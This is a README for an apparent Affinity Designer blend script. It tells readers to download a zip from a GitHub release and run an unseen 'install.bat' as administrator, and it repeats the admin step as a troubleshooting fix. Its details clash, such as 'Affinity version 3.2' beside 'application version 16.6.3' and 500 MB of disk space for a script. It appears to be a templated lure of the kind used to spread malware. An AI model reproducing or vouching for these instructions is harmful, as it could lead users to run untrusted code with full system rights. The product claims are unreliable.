# 🛠️ blend-tool-pro-affinity-v32 - Create smooth vector transitions with ease

[![Download Software](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/whydouwa3595/blend-tool-pro-affinity-v32)

## 📖 About this project
This tool helps you build transitions between shapes, groups, and paths in Affinity Designer. It uses JavaScript to automate the process of creating graded steps between two objects. You can adjust the number of steps and the spacing between objects. This script works with Affinity version 3.2 and the application version 16.6.3.

## 📋 System requirements
Ensure your computer meets these requirements before you start:
* Windows 10 or 11 (64-bit).
* Affinity Designer version 3.2 installed.
* At least 500 MB of free disk space.
* A mouse or trackpad for precise object selection.

## 📥 How to download and install
You must visit the project page to get the latest version of the software.

1. Visit [https://github.com/whydouwa3595/blend-tool-pro-affinity-v32](https://github.com/whydouwa3595/blend-tool-pro-affinity-v32).
2. Look for the "Releases" section on the right side of the screen.
3. Click the most recent version link.
4. Download the folder titled "blend-tool-pro-win.zip" to your computer.
5. Open your "Downloads" folder.
6. Right-click the zip file and select "Extract All".
7. Choose a destination folder and click "Extract".

## 🚀 Setting up the script
Once you extract the files, follow these steps to prepare the tool:

1. Open the folder you just extracted.
2. Locate the installation file named "install.bat".
3. Right-click the file and select "Run as administrator".
4. A small window will appear. Follow the prompts on your screen.
5. Wait for the process to finish. The system will copy the necessary files into your Affinity script directory.
6. Restart Affinity Designer so the program can detect the new script.

## 🎨 Using the blend tool
Now that you installed the tool, you can create your first blend.

1. Open Affinity Designer.
2. Draw two shapes on your canvas.
3. Select both shapes using the selection tool.
4. Navigate to the top menu and click "Window".
5. Select "Scripts" to open the script panel.
6. Find "Blend Tool Pro" in the list and click it.
7. A dialog box will appear.
8. Enter the number of steps you want.
9. Click "Execute" to generate the transition.
10. The script will create new objects between your two original shapes.

## 🛠️ Troubleshooting common issues
If the script does not appear or produce objects, check these common fixes:

* **Script does not show in the menu:** Ensure you placed the files in the correct folder mentioned during the installation process. Restart Affinity Designer after you confirm the file location.
* **Access denied error:** Right-click the installer file and select "Run as administrator" to grant necessary permissions to create files in your system directory.
* **Script creates nothing:** Make sure you select two valid vector shapes or paths. Groups can work, but nested effects sometimes interfere with the script logic. Ungroup your objects if the script fails to bridge the gap.
* **Application crashes:** Check your version of Affinity Designer. This script requires version 3.2. Older versions lack the scripting API required for smooth operation.

## ⚙️ Customizing your workflow
You can change how the tool behaves by editing the configuration file.

1. Open the installation folder.
2. Find the file named "config.json".
3. Open this file in Notepad.
4. You can adjust the default step count or spacing settings here.
5. Save the file and restart your script in Affinity.

This tool functions best when you use simple paths for your starting and ending objects. Complex objects with many nodes cause the script to run longer. If you have a complex shape, simplify it first by using the "Vector" tools in Affinity before you run the blend.

Keywords: affinity, scripting, vector, design, windows, automation